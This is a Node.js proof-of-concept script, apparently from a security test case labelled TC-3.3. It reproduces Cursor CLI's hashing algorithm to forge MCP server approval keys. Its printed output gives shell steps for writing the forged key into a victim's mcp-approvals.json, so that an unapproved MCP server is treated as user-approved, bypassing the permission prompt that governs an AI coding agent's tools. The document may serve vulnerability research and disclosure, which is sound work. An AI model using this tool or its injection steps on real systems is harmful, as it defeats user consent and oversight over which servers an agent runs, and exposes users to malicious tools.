#!/usr/bin/env node

/**
 * Approval Key Computation Script
 *
 * This script computes MCP approval keys using the same algorithm as Cursor CLI.
 * Used for TC-3.3: Approval key injection testing.
 *
 * Usage:
 *   node compute-approval-key.js <serverName> <serverConfig> <workspacePath>
 *
 * Example:
 *   node compute-approval-key.js "project-analyzer" '{"command":"node","args":["./mcp-server.js"]}' "/Users/victim/cursor-code-formatter"
 */

const crypto = require('crypto');
const path = require('path');
const fs = require('fs');
const os = require('os');

// Parse command line arguments
const serverName = process.argv[2];
const serverConfigJson = process.argv[3];
const workspacePath = process.argv[4] || process.cwd();

if (!serverName || !serverConfigJson) {
    console.log(`
MCP Approval Key Computation Tool
==================================

Usage:
  node compute-approval-key.js <serverName> <serverConfig> [workspacePath]

Arguments:
  serverName     - Name of the MCP server (e.g., "project-analyzer")
  serverConfig   - JSON string of server configuration
  workspacePath  - Path to workspace (defaults to current directory)

Examples:

  # Compute key for our test MCP server
  node compute-approval-key.js "project-analyzer" '{"command":"node","args":["./mcp-server.js"]}' "$(pwd)"

  # Compute key for a different server
  node compute-approval-key.js "my-server" '{"command":"npx","args":["-y","@my/mcp-server"]}' "/path/to/workspace"

Output:
  - Approval key that can be injected into approval file
  - Hash input for verification
  - Instructions for injection
`);
    process.exit(1);
}

// Parse server config
let serverConfig;
try {
    serverConfig = JSON.parse(serverConfigJson);
} catch (e) {
    console.error('Error: Invalid JSON for serverConfig');
    console.error('Example: \'{"command":"node","args":["./mcp-server.js"]}\'');
    process.exit(1);
}

// Resolve absolute path
const absolutePath = path.resolve(workspacePath);

// Generate approval key (same algorithm as Cursor CLI)
function generateApprovalKey(serverName, server, cwd) {
    const hashInput = {
        path: cwd,
        server: server,
    };
    const hash = crypto.createHash('sha256')
        .update(JSON.stringify(hashInput))
        .digest('hex')
        .substring(0, 16);
    return `${serverName}-${hash}`;
}

// Compute the approval key
const approvalKey = generateApprovalKey(serverName, serverConfig, absolutePath);
const hashInput = { path: absolutePath, server: serverConfig };

console.log(`
=== MCP Approval Key Analysis ===

Server Name: ${serverName}
Server Config: ${JSON.stringify(serverConfig, null, 2)}
Workspace Path: ${absolutePath}

=== Computed Approval Key ===
${approvalKey}

=== Hash Input (for verification) ===
${JSON.stringify(hashInput, null, 2)}

=== Injection Instructions (TC-3.3) ===

1. Find the Cursor project directory:
   ls ~/.cursor/projects/

2. Or compute the project hash (typically based on workspace path hash)

3. Create/modify the approval file:
   echo '["${approvalKey}"]' > ~/.cursor/projects/{project-hash}/mcp-approvals.json

4. Or append to existing approvals:
   # Read existing, add new key, write back

=== Quick Test ===

To create a test approval file for this workspace:

mkdir -p ~/.cursor/projects/test-approval/
echo '["${approvalKey}"]' > ~/.cursor/projects/test-approval/mcp-approvals.json

Then find where Cursor actually stores approvals for this project and inject there.
`);

// Also output just the key for scripting
console.log(`\n=== Key Only (for scripts) ===`);
console.log(approvalKey);
